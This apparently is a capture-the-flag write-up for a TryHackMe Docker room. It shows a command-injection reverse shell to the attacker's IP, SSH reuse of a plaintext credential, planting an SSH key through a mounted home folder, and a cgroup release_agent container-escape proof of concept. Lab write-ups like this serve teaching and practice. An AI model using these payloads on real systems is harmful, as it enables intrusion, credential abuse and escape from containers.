# Introduction

We were fortunate enough to be visited by rushisec and stealthcopter - alumni friends from my degree course - to give an overview of Docker, plus a Docker-based CTF for us to participate in. I found it to be a really enjoyable challenge, and quite interesting being based around container escapes.

Challenge: USW Docker Event

Creators: rushisec, stealthcopter

Platform: Try Hack Me

URL: [http://tryhackme.com/jr/uswdockerevent](http://tryhackme.com/jr/uswdockerevent)

After accessing the room on Try Hack Me at the above URL and clicking “Start Machine”, once the machine has loaded, you are presented with the IP address.

Navigating to the provided IP address in the attacking machine’s browser presents you with a website which allows you to check for available domains. This feature is quite interesting. How does it check for domains? Where does it pass the inputted data?

Starting the input with a semi-colon `;` and adding the bash command `ls` confirms that this feature is using bash to perform domain lookups. This can be exploited to provide us with extra information such as the /etc/passwd file, or to execute a reverse shell on the webserver.

# Web App Shell & Flag 1

> What is the value found in /flag1.txt on the initial "webapp" container?
> 

A netcat listener was created on the attacking machine:

```bash
root@ip-10-10-223-208:~# nc -lvnp 443
Listening on [0.0.0.0] (family 0, port 443)
```

A [bash reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) was added to the input.

`;bash -c 'bash -i >& /dev/tcp/10.10.223.208/443 0>&1'`

When the command is submitted on the website, the attacker’s netcat listener receives the connection and opens a shell:

```bash
Connection from 10.10.209.31 35464 received!
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@webapp:/app#
```

Typing `ls` to check the files in the current directory for the flag does not provide.

```bash
/app# ls
ls
__pycache__
app.py
db.py
requirements.txt
static
templates
root@webapp:/app# cd ..
cd ..
root@webapp:/# ls
ls
app
bin
boot
dev
etc
flag1.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

The flag file appears to be in the preceeding folder. Read this file using `cat flag1.txt` to receive the first flag!

# DB Shell & Flag 2

> What is the value found in /flag2.txt on the second container, "mysql"?
> 

When looking through the files in the previous folder /app, there was a file called ‘db.py’. This file contained plaintext credentials for a mysql server. Attempting to connect to the mysql server using `mysql -h db -u root -p NiftySkyPlantedWorry` unfortunately does not work. What if we were to try these credentials for another service instead, such as SSH? It is common for lazy administrators to reuse the same passwords for multiple services, so it’s worth a shot?

```bash
root@webapp:/app# ssh root@db
ssh root@db
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
```

OK, that didn’t quite work. The shell seems to need upgrading first. This can be done using Python within the terminal. As there are Python files already inside this folder, it’s safe to say that Python is likely installed.

```python
python -c "import pty;pty.spawn('/bin/bash');"
```

 

Using this command successfully upgrades the shell.

```python
root@webapp:/app# ssh root@db
ssh root@db
The authenticity of host 'db (172.19.0.4)' can't be established.
ECDSA key fingerprint is SHA256:JPHo4WFZ6o8hA7rNF+7ZVSp/hLT8JMR5YnbiC7Z10v4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added 'db,172.19.0.4' (ECDSA) to the list of known hosts.
root@db's password: NiftySkyPlantedWorry

Linux db 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@db:~#
```

Trying `ssh root@db` again is now successful, and the password from the [db.py](http://db.py) file is correct.

Typing `ls` again on entry does not provide a flag. Navigate to the preceeding folder using `cd ..` and `ls` again to find flag2.txt. `cat flag2.txt` to retrieve the 2nd flag!

# Proxy Shell & Flag 3

> What is the value found in /flag3.txt on the third container, "proxy"?
> 

There is an interesting directory at `/opt/webby-home/` . This sounds like a user’s home folder and likely mounted from another host. Using the `findmnt` command shows a list of mounted directories, with webby-home among them.

```python
|--/opt/webby-home
|       /dev/mapper/ubuntu--vg-ubuntu--lv[/var/lib/docker/volumes/containers_shared/_data]
```

After checking for hidden files and directories using `ls -lah`, an `.ssh` directory is present.

This means, as current root on db, it is possible to add your own key to authorized_keys to allow for ssh connection to webby on their host machine from which this directory was mounted.

To do this, type `ssh-keygen` to create a key. When asked where to save the file, give the file a name such as **key**.

Two files will be created, a private key “key” and a public key “key.pub”.

`cat [key.pub](http://key.pub) >> authorized_keys` to add the public key to the authorized_keys file.

The user **webby** at the host **proxy** can now be accessed through SSH, using the key generated previously.

`ssh -i key webby@proxy` 

On successful login, it’s time to find flag 3.

```bash
webby@proxy:~$ ls
ls
webby@proxy:~$ cd ..
cd ..
webby@proxy:/home$ ls
ls
webby
webby@proxy:/home$ cd ..
cd ..
webby@proxy:/$ ls
ls
bin   docker-entrypoint.d   flag3.txt  lib64  opt   run   sys  var
boot  docker-entrypoint.sh  home       media  proc  sbin  tmp
dev   etc                   lib        mnt    root  srv   usr
```

`cat flag3.txt` to retrieve the flag,

# Proxy root & flag 4

> “What is the value found in /root/flag4.txt in the root directory of the third container, "proxy"?”
> 

webby is not the root user for this host. To access flag4 at /root we will need to escalate our privileges. Using `sudo -l` to check the sudo status of the current user shows that webby can in fact run all commands as sudo, without a password.

```bash
sudo -l
Matching Defaults entries for webby on proxy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User webby may run the following commands on proxy:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

Due to this, it is simply a matter of `sudo su` to become root.

```bash
sudo su
root@proxy:/# cd /root
root@proxy:~# ls
flag4.txt
```

`cat flag4.txt` to retrieve the flag.

# Host machine & flag 5

> What is the value found in /flag5.txt on the host machine?
> 

To reach the host machine, a container escape will be needed. After researching container escapes on google, the following solution was found on [trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/):

 

```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash
 
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

This proof of concept code runs the `ps` command on the host machine. However, flag 5 is required to complete this challenge. Therefore, `ps` in the script is replaced by `ls` to display the files.

This is then pasted into the `root@proxy` shell, and the contents of the mounted directory of the host system is displayed. flag5.txt appears to be in this directory. Therefore, it is now possible to replace `ls` in the script with `cat flag5.txt` and again, paste the completed script into the `root@proxy` shell. Flag 5 has now been retrieved!